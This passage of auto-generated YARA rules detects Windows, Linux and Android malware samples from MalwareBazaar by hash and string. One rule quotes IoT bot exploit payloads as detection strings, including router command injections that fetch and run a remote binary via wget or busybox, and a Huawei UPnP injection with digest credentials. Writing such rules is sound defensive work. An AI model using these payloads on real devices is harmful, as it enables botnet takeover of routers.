      description = "evidences - from files 95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3debdab.exe, aa8f8a3e268493157e62d93ab9cafb94573606fe43a80e63e3e4f2e5c9b22a5b.exe, b58b7853318f6c9f0d66d1f2a8d7ff5ad42be424fdf8e04615d8c38980b3811b.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3debdab"
      hash2 = "aa8f8a3e268493157e62d93ab9cafb94573606fe43a80e63e3e4f2e5c9b22a5b"
      hash3 = "b58b7853318f6c9f0d66d1f2a8d7ff5ad42be424fdf8e04615d8c38980b3811b"
   strings:
      $s1 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s2 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide
      $s3 = "xWI96tRI" fullword ascii /* Goodware String - occured 1 times */
      $s4 = "D$0@8{" fullword ascii /* Goodware String - occured 1 times */
      $s5 = "vKfffff" fullword ascii /* Goodware String - occured 1 times */
      $s6 = "f;\\$4r" fullword ascii /* Goodware String - occured 1 times */
      $s7 = "f;\\$<r" fullword ascii /* Goodware String - occured 1 times */
      $s8 = "api-ms-win-core-file-l1-2-2" fullword wide /* Goodware String - occured 1 times */
      $s9 = "u3HcH<H" fullword ascii /* Goodware String - occured 2 times */
      $s10 = "D$(H!L$ E3" fullword ascii /* Goodware String - occured 2 times */
      $s11 = "H;xXu5" fullword ascii
      $s12 = " @8~8t" fullword ascii
      $s13 = "uED8r(t" fullword ascii
      $s14 = "D81uUL9r" fullword ascii
      $s15 = "u/HcH<H" fullword ascii
      $s16 = " A_A^A\\_^" fullword ascii
      $s17 = " A_A^A]" fullword ascii
      $s18 = "fD94H}aD" fullword ascii
      $s19 = ";I9}(tiH" fullword ascii
      $s20 = "fB94ht" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _6e45b4a85550f9149ebdb3450948ca98aadee4e05a40791eaec93d2b55b93ffd_95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3_5 {
   meta:
      description = "evidences - from files 6e45b4a85550f9149ebdb3450948ca98aadee4e05a40791eaec93d2b55b93ffd.exe, 95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3debdab.exe, aa8f8a3e268493157e62d93ab9cafb94573606fe43a80e63e3e4f2e5c9b22a5b.exe, b58b7853318f6c9f0d66d1f2a8d7ff5ad42be424fdf8e04615d8c38980b3811b.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "6e45b4a85550f9149ebdb3450948ca98aadee4e05a40791eaec93d2b55b93ffd"
      hash2 = "95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3debdab"
      hash3 = "aa8f8a3e268493157e62d93ab9cafb94573606fe43a80e63e3e4f2e5c9b22a5b"
      hash4 = "b58b7853318f6c9f0d66d1f2a8d7ff5ad42be424fdf8e04615d8c38980b3811b"
   strings:
      $s1 = " Type Descriptor'" fullword ascii
      $s2 = "operator co_await" fullword ascii
      $s3 = "operator<=>" fullword ascii
      $s4 = " Base Class Descriptor at (" fullword ascii
      $s5 = " Class Hierarchy Descriptor'" fullword ascii
      $s6 = " Complete Object Locator'" fullword ascii
      $s7 = "network down" fullword ascii /* Goodware String - occured 567 times */
      $s8 = "wrong protocol type" fullword ascii /* Goodware String - occured 567 times */
      $s9 = "connection already in progress" fullword ascii /* Goodware String - occured 567 times */
      $s10 = "owner dead" fullword ascii /* Goodware String - occured 567 times */
      $s11 = "network reset" fullword ascii /* Goodware String - occured 567 times */
      $s12 = "connection aborted" fullword ascii /* Goodware String - occured 568 times */
      $s13 = "protocol not supported" fullword ascii /* Goodware String - occured 568 times */
      $s14 = "network unreachable" fullword ascii /* Goodware String - occured 569 times */
      $s15 = "host unreachable" fullword ascii /* Goodware String - occured 571 times */
      $s16 = "protocol error" fullword ascii /* Goodware String - occured 588 times */
      $s17 = "connection refused" fullword ascii /* Goodware String - occured 597 times */
      $s18 = " delete[]" fullword ascii
      $s19 = "__swift_3" fullword ascii
      $s20 = "__swift_2" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _41f7ed67877a3d6805d60ad5ea91816f2092012fa316f9fbf1b8fbb953fbada5_a430ed516a8a596570bc3a496b99cf6c7dd0a69ae0614ab2d2de6e9a8a_6 {
   meta:
      description = "evidences - from files 41f7ed67877a3d6805d60ad5ea91816f2092012fa316f9fbf1b8fbb953fbada5.elf, a430ed516a8a596570bc3a496b99cf6c7dd0a69ae0614ab2d2de6e9a8a6c2fc8.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "41f7ed67877a3d6805d60ad5ea91816f2092012fa316f9fbf1b8fbb953fbada5"
      hash2 = "a430ed516a8a596570bc3a496b99cf6c7dd0a69ae0614ab2d2de6e9a8a6c2fc8"
   strings:
      $s1 = "%s: %s: %d: %s: Assertion `%s' failed." fullword ascii
      $s2 = "Remote I/O error" fullword ascii
      $s3 = "#$%&'()*+,234567" fullword ascii /* hex encoded string '#Eg' */
      $s4 = "nameserver" fullword ascii /* Goodware String - occured 8 times */
      $s5 = "Protocol error" fullword ascii /* Goodware String - occured 26 times */
      $s6 = "Protocol not supported" fullword ascii /* Goodware String - occured 73 times */
      $s7 = "Connection refused" fullword ascii /* Goodware String - occured 127 times */
      $s8 = "hlLjztqZ" fullword ascii
      $s9 = "npxXoudifFeEgGaACSncs[" fullword ascii
      $s10 = ";<=>?@ABCDEFGJIMOPQRSTUVWX[\\^_`abcxyz{|}~" fullword ascii
      $s11 = "Wrong medium type" fullword ascii
      $s12 = "npxXoudifFeEgGaACScs" fullword ascii
      $s13 = "nfinity" fullword ascii /* Goodware String - occured 1 times */
      $s14 = "?function?" fullword ascii
      $s15 = "Not a XENIX named type file" fullword ascii
      $s16 = "Structure needs cleaning" fullword ascii
      $s17 = "No XENIX semaphores available" fullword ascii
      $s18 = "Is a named type file" fullword ascii
      $s19 = "Unknown error " fullword ascii /* Goodware String - occured 1 times */
      $s20 = "hlLjztq" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _08122b836320e81dd3de7f789ea954d3ab9feabccee9200be3b37396a7fbffcc_8419ca7a15cfcf147d47986cc5a9ca3fc6bd5bcff1a9bbad455227bc21_7 {
   meta:
      description = "evidences - from files 08122b836320e81dd3de7f789ea954d3ab9feabccee9200be3b37396a7fbffcc.elf, 8419ca7a15cfcf147d47986cc5a9ca3fc6bd5bcff1a9bbad455227bc214f1eef.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "08122b836320e81dd3de7f789ea954d3ab9feabccee9200be3b37396a7fbffcc"
      hash2 = "8419ca7a15cfcf147d47986cc5a9ca3fc6bd5bcff1a9bbad455227bc214f1eef"
   strings:
      $s1 = "relogin.htm" fullword ascii
      $s2 = "User-Agent: curl/7.88.1" fullword ascii
      $s3 = "authkey" fullword ascii
      $s4 = "hostport=" fullword ascii
      $s5 = "{ \"Name\" : \"OPSystemUpgrade\", \"OPSystemUpgrade\" : { \"Action\" : \"Start\", \"Type\" : \"System\" }, \"SessionID\" : \"0x0" ascii
      $s6 = "Hash.Cookie" fullword ascii
      $s7 = "o?head-?ebs" fullword ascii
      $s8 = "t{|}f&~gq{&fdt{|}f9&d&oggodm&kget{|}f:&d&oggodm&kget{|}f;&d&oggodm&kget{|}f<&d&oggodm&kget{|}f&~gax{|}f|&kget{|}f&{axfm|&fm|" fullword ascii
      $s9 = "GoAhead" fullword ascii
      $s10 = "\"OPSystemUpgrade\", \"Ret\" : 100" fullword ascii
      $s11 = "cgi-bin/main-cgi" fullword ascii
      $s12 = "?ages/?ogin.htm" fullword ascii
      $s13 = "mini_httpd" fullword ascii
      $s14 = "doc/script" fullword ascii
      $s15 = "HTTPD_gw" fullword ascii
      $s16 = "{ \"Ret\" : 100, \"SessionID\" : \"0x0\" }" fullword ascii
      $s17 = "?ogin.rsp" fullword ascii
      $s18 = "pluginVersionTip" fullword ascii
      $s19 = "TOTOLINK" fullword ascii
      $s20 = "TKXGYKI" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _6e45b4a85550f9149ebdb3450948ca98aadee4e05a40791eaec93d2b55b93ffd_95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3_8 {
   meta:
      description = "evidences - from files 6e45b4a85550f9149ebdb3450948ca98aadee4e05a40791eaec93d2b55b93ffd.exe, 95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3debdab.exe, b58b7853318f6c9f0d66d1f2a8d7ff5ad42be424fdf8e04615d8c38980b3811b.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "6e45b4a85550f9149ebdb3450948ca98aadee4e05a40791eaec93d2b55b93ffd"
      hash2 = "95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3debdab"
      hash3 = "b58b7853318f6c9f0d66d1f2a8d7ff5ad42be424fdf8e04615d8c38980b3811b"
   strings:
      $s1 = "      <longPathAware xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">true</longPathAware>" fullword ascii
      $s2 = ".data$rs" fullword ascii
      $s3 = "  </compatibility>" fullword ascii
      $s4 = "  <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">" fullword ascii
      $s5 = "008deee3d3f0" ascii
      $s6 = "  </dependency>" fullword ascii
      $s7 = "  </trustInfo>" fullword ascii
      $s8 = "  <dependency>" fullword ascii
      $s9 = ".rdata$voltmd" fullword ascii
      $s10 = "  <application xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii
      $s11 = ".CRT$XIAC" fullword ascii /* Goodware String - occured 3 times */
      $s12 = "      </requestedPrivileges>" fullword ascii
      $s13 = "83d0f6d0da78" ascii
      $s14 = "d69d4a4a6e38" ascii
      $s15 = "a2440225f93a" ascii
      $s16 = "48fd50a15a9a" ascii
      $s17 = "  </application>" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _417c60b23fbd8dde6ce9524f83532b6375c93fdbb6b0da727a0ea0fdf514eaee_60cf037d682bb28c7594d93f1d2bc8f1bac75b7b32a5a4caef81b68dc3_9 {
   meta:
      description = "evidences - from files 417c60b23fbd8dde6ce9524f83532b6375c93fdbb6b0da727a0ea0fdf514eaee.elf, 60cf037d682bb28c7594d93f1d2bc8f1bac75b7b32a5a4caef81b68dc346d7b2.elf, 931b1fdbbaf49829ac46ee129e0c628624b7a315f0abd4bd229b4837b1e1ee02.elf, 966fe54323163222cacbbfa6e1a7884f0cde8e68f1ac065d7c45995457265da9.elf, a0c7c82f75cba0b84dcf1a2a3e785116f06c86cbfa40d60664f890d06383096a.elf, c54718cedd4e24bda9fb2b7676e11db2f232c57005c8c72d875c3a3eff050c2a.elf, eb7110191ac7e0c0e739339d0ec5e97cc8cc19d85f3ea1ffeae87d0413e0ca3b.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "417c60b23fbd8dde6ce9524f83532b6375c93fdbb6b0da727a0ea0fdf514eaee"
      hash2 = "60cf037d682bb28c7594d93f1d2bc8f1bac75b7b32a5a4caef81b68dc346d7b2"
      hash3 = "931b1fdbbaf49829ac46ee129e0c628624b7a315f0abd4bd229b4837b1e1ee02"
      hash4 = "966fe54323163222cacbbfa6e1a7884f0cde8e68f1ac065d7c45995457265da9"
      hash5 = "a0c7c82f75cba0b84dcf1a2a3e785116f06c86cbfa40d60664f890d06383096a"
      hash6 = "c54718cedd4e24bda9fb2b7676e11db2f232c57005c8c72d875c3a3eff050c2a"
      hash7 = "eb7110191ac7e0c0e739339d0ec5e97cc8cc19d85f3ea1ffeae87d0413e0ca3b"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s3 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /h; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs; sh /tmp/.vs)</NewStatusURL><NewDown" ascii
      $s4 = "crontab /tmp/crontab.tmp" fullword ascii
      $s5 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s7 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s8 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s9 = "HOST: 255.255.255.255:1900" fullword ascii
      $s10 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s11 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s12 = "service:service-agent" fullword ascii
      $s13 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s14 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s15 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s16 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s17 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
      $s18 = "Cookie: user=admin" fullword ascii
      $s19 = " default" fullword ascii
      $s20 = "88645cefb1f9ede0e336e3569d75ee30" ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1138aaff88a60f99f80f3ae2cbb8447125f9904785c47c662266ddfd5f3916ed_a430ed516a8a596570bc3a496b99cf6c7dd0a69ae0614ab2d2de6e9a8a_10 {
   meta:
      description = "evidences - from files 1138aaff88a60f99f80f3ae2cbb8447125f9904785c47c662266ddfd5f3916ed.elf, a430ed516a8a596570bc3a496b99cf6c7dd0a69ae0614ab2d2de6e9a8a6c2fc8.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "1138aaff88a60f99f80f3ae2cbb8447125f9904785c47c662266ddfd5f3916ed"
      hash2 = "a430ed516a8a596570bc3a496b99cf6c7dd0a69ae0614ab2d2de6e9a8a6c2fc8"
   strings:
      $s1 = "@c$+ b" fullword ascii
      $s2 = "<@BB4*" fullword ascii
      $s3 = "<@BC4 " fullword ascii
      $s4 = "B4g&c40" fullword ascii
      $s5 = "B4*)c4" fullword ascii
      $s6 = "<@BB4+" fullword ascii
      $s7 = "<vTB4," fullword ascii
      $s8 = "<@BC4(" fullword ascii
      $s9 = "<vTB4!(`" fullword ascii
      $s10 = "QZ)5!H" fullword ascii
      $s11 = "Be4!0@" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _41f7ed67877a3d6805d60ad5ea91816f2092012fa316f9fbf1b8fbb953fbada5_b4b411a4a713899565522f711036bb21c3925ee426162a870109794bb3_11 {
   meta:
      description = "evidences - from files 41f7ed67877a3d6805d60ad5ea91816f2092012fa316f9fbf1b8fbb953fbada5.elf, b4b411a4a713899565522f711036bb21c3925ee426162a870109794bb395b262.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "41f7ed67877a3d6805d60ad5ea91816f2092012fa316f9fbf1b8fbb953fbada5"
      hash2 = "b4b411a4a713899565522f711036bb21c3925ee426162a870109794bb395b262"
   strings:
      $s1 = "8&4B33" fullword ascii
      $s2 = "H'79~O" fullword ascii
      $s3 = "0&5)ZQ" fullword ascii
      $s4 = "(&4c33" fullword ascii
      $s5 = "/4cY94B" fullword ascii
      $s6 = "4c!y4B" fullword ascii
      $s7 = "  !,B " fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3debdab_96ba91a5d91fb2aaf07a446606ef99475f2dc8e7641fd4c671308c2064_12 {
   meta:
      description = "evidences - from files 95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3debdab.exe, 96ba91a5d91fb2aaf07a446606ef99475f2dc8e7641fd4c671308c20643f6252.apk, b58b7853318f6c9f0d66d1f2a8d7ff5ad42be424fdf8e04615d8c38980b3811b.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3debdab"
      hash2 = "96ba91a5d91fb2aaf07a446606ef99475f2dc8e7641fd4c671308c20643f6252"
      hash3 = "b58b7853318f6c9f0d66d1f2a8d7ff5ad42be424fdf8e04615d8c38980b3811b"
   strings:
      $s1 = "\"5iHK:" fullword ascii /* Goodware String - occured 1 times */
      $s2 = "$\"1IHJ2" fullword ascii
      $s3 = "9-hI+Z" fullword ascii
      $s4 = "E)FqJP" fullword ascii
      $s5 = "$#9)HI*R" fullword ascii
      $s6 = "8%(I)JS" fullword ascii
      $s7 = "e)Gy*P" fullword ascii
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x4b50 ) and filesize < 25000KB and pe.imphash() == "a06f302f71edd380da3d5bf4a6d94ebd" and ( all of them )
      ) or ( all of them )
}

rule _417c60b23fbd8dde6ce9524f83532b6375c93fdbb6b0da727a0ea0fdf514eaee_966fe54323163222cacbbfa6e1a7884f0cde8e68f1ac065d7c45995457_13 {
   meta:
      description = "evidences - from files 417c60b23fbd8dde6ce9524f83532b6375c93fdbb6b0da727a0ea0fdf514eaee.elf, 966fe54323163222cacbbfa6e1a7884f0cde8e68f1ac065d7c45995457265da9.elf, c54718cedd4e24bda9fb2b7676e11db2f232c57005c8c72d875c3a3eff050c2a.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "417c60b23fbd8dde6ce9524f83532b6375c93fdbb6b0da727a0ea0fdf514eaee"
      hash2 = "966fe54323163222cacbbfa6e1a7884f0cde8e68f1ac065d7c45995457265da9"
      hash3 = "c54718cedd4e24bda9fb2b7676e11db2f232c57005c8c72d875c3a3eff050c2a"
   strings:
      $s1 = ".mdebug.abi32" fullword ascii
      $s2 = ".data.rel.ro" fullword ascii /* Goodware String - occured 3 times */
      $s3 = "B4\\4c40" fullword ascii
      $s4 = "nB4tPc4" fullword ascii
      $s5 = "pB4Oec4(" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( all of them )
      ) or ( all of them )
}
